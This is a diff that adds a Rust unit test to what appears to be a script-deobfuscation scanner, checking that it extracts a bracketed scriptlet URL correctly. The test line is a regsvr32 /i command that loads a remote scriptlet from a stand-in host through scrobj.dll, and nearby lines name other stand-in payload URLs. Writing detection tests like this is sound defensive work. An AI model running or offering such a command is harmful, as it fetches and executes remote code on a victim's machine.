@@ -28803,6 +28803,31 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn regsvr32_scriptlet_url_in_deob_text_preserves_balanced_bracket_suffix() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "http://regsvr32-scriptlet.example/payload[1]";
+        let line = format!(r#"regsvr32 /s /n /u /i:{url} scrobj.dll"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 deob-text bracketed scriptlet URL was truncated: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "regsvr32 deob-text bracketed scriptlet URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_equals_bound_scriptlet_url_in_deob_text_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://regsvr32-equals-deob.example/payload.sct";
